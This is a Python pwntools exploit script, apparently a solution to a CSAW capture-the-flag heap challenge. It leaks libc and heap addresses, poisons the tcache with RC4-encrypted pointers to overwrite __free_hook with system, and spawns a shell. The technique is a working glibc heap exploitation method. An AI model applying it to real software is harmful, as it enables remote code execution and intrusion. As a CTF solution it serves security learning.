#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from Crypto.Cipher import ARC4
from pwn import *

elf = context.binary = ELF("./super_secure_heap_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc pwn.csaw.io 9998"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def key(action, *a, **kw):
    io.sendlineafter(b">\n", b"1")
    action(*a, **kw)


def content(action, *a, **kw):
    io.sendlineafter(b">\n", b"2")
    return action(*a, **kw)


def add(sz):
    io.sendlineafter(b">\n", b"1")
    io.sendlineafter(b"item:\n", str(sz).encode())


def delete(idx):
    io.sendlineafter(b">\n", b"2")
    io.sendlineafter(b"remove:\n", str(idx).encode())


def edit(idx, sz, data, is_content=False, key_idx=None):
    io.sendlineafter(b">\n", b"3")
    io.sendlineafter(b"modify:\n", str(idx).encode())
    if is_content:
        io.sendlineafter(b"with:\n", str(key_idx).encode())
    io.sendlineafter(b"size of the content:\n", str(sz).encode())
    io.sendafter(b"content:\n", data)


def show(idx):
    io.sendlineafter(b">\n", b"4")
    io.sendlineafter(b"show:\n", str(idx).encode())
    io.recvline()
    return io.recvline()


"""
Can leak data when freeing content
"""

"""
libc leak
"""

content(add, 0x500)  # idx = 0
content(add, 0x11)  # idx = 1

# 0x500 sized chunk goes to unsorted bin
content(delete, 0)
libc_leak = u64(content(show, 0)[:6].ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ecbe0
assert (libc.address & 0xfff == 0)
log.info(f"{libc.address=:#x}")

"""
tcache poisoning to overwrite `__free_hook`
"""

# This key is solely for encrypting (not for heap stuff)
key(add, 0x11)  # idx = 0
rc4_key = b"B" * 8
key(edit, 0, 0x8, rc4_key + b"\x00")

# Populate tcachebins with 2 bins
key(add, 0x11)  # idx = 1
key(delete, 1)
content(delete, 1)

heap_leak = u64(content(show, 1)[:6].ljust(8, b"\x00"))
heap_base = heap_leak >> 12 << 12
log.info(f"{heap_base=:#x}")

cipher = ARC4.new(rc4_key)
target = libc.symbols["__free_hook"] - 0x8
log.info(f"{target=:#x}")
payload = cipher.encrypt(p64(target))
# Overwrite `fd` field with desired address to be allocated
content(edit, 1, 0x8, payload, is_content=True, key_idx=0)

content(add, 0x11)  # idx = 2

# Allocated content chunk @ `__free_hook`
content(add, 0x11)  # idx = 3

# Overwrite `_free_hook` with `system`
cipher = ARC4.new(rc4_key)
payload = cipher.encrypt(flat(0, p64(libc.symbols["system"])))
content(edit, 3, 0x10, payload, is_content=True, key_idx=0)
content(add, 0x21)  # idx = 4

cipher = ARC4.new(rc4_key)
payload = cipher.encrypt(b"/bin/sh\x00")
content(edit, 4, 0x8, payload, is_content=True, key_idx=0)
content(delete, 4)

io.interactive()
